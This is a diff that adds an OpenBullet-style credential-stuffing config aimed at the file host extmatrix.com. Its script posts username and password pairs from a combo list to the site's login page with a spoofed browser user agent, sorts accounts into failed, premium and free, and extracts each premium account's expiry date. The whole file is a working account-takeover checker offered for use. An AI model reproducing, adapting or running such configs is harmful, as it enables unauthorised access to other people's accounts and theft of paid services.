@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "extmatrix.com",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-15T16:52:33.3371864+00:00",
+  "AdditionalInfo": "",
+  "Author": "icebergblack2003",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 1195262141
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 1597332202
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "http://www.extmatrix.com/login.php" AutoRedirect=TRUE 
+  CONTENT "user=<USER>&pass=<PASS>&submit=Login&task=dologin&return=.%2Fmembers%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Please enter the correct captcha code" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains ">Premium Member<" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY ">Free Member<" 
+PARSE "<SOURCE>" LR "Premium End:</td>" "</td>" Recursive=FALSE -> CAP "Scadenza" "" "" 
